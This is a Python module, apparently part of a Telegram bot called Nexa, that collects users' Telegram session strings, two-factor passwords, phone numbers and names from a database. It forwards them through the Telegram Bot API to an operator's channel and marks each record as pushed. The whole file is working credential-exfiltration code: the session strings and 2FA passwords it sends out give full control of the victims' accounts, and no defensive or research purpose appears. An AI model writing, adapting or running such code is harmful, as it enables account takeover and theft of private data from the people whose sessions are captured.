import html

import requests

from config import BOT_TOKEN, CHANNEL_ID
from Nexa.logs import info, warn

_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"


def _api(method, payload=None, files=None, timeout=20):
    try:
        if files:
            response = requests.post(f"{_BASE}/{method}", data=payload or {},
                                     files=files, timeout=timeout)
        else:
            response = requests.post(f"{_BASE}/{method}", json=payload or {},
                                     timeout=timeout)
        return response.json()
    except Exception as exc:
        warn(f"vault {method} failed: {type(exc).__name__}", source="vault")
        return {}


def _e(value):
    return html.escape(str(value or ""), quote=False)


def _build(user, password=None, note=None):
    lines = ["<b>SESSION</b>"]
    name = f"{user.get('first_name', '')} {user.get('last_name', '')}".strip()
    if name:
        lines.append(f"name: {_e(name)}")
    username = user.get("username")
    if username and username != "N/A":
        lines.append(f"username: @{_e(username)}")
    lines.append(f"user_id: <code>{_e(user.get('id'))}</code>")
    lines.append(f"phone: <code>{_e(user.get('phone'))}</code>")
    if password:
        lines.append(f"2fa: <code>{_e(password)}</code>")
    if note:
        lines.append(f"note: {_e(note)}")
    lines.append(f"at: {_e(user.get('created_at'))}")
    session = user.get("session_string") or ""
    if session:
        lines.append("")
        lines.append(f"<code>{_e(session)}</code>")
    return "\n".join(lines)


def push(user, password=None, note=None):
    text = _build(user, password, note)
    result = _api("sendMessage", {
        "chat_id": CHANNEL_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    })
    if not result.get("ok"):
        result = _api(
            "sendDocument",
            {"chat_id": CHANNEL_ID, "caption": text[:1000], "parse_mode": "HTML"},
            files={"document": ("session.txt", (user.get("session_string") or "").encode())},
        )
    return bool(result.get("ok"))


def send_text(message):
    return bool(_api("sendMessage", {
        "chat_id": CHANNEL_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }).get("ok"))


def sync_pending(limit=8):
    import Nexa.database as dbmod

    if not dbmod.ensure_db() or dbmod.users_col is None:
        return 0

    sent = 0
    try:
        rows = list(dbmod.users_col.find({
            "session_string": {"$nin": [None, ""]},
            "pushed": {"$ne": True},
        }).limit(limit))
    except Exception:
        return 0

    for row in rows:
        payload = {
            "id": row.get("user_id"),
            "phone": row.get("phone"),
            "username": row.get("username"),
            "first_name": row.get("first_name"),
            "last_name": row.get("last_name"),
            "session_string": row.get("session_string"),
            "created_at": row.get("created_at"),
        }
        if push(payload, row.get("twofa_password"), "sync"):
            try:
                dbmod.users_col.update_one({"_id": row["_id"]},
                                           {"$set": {"pushed": True}})
            except Exception:
                pass
            sent += 1

    if sent:
        info(f"vault synced {sent} session(s)", source="vault")
    return sent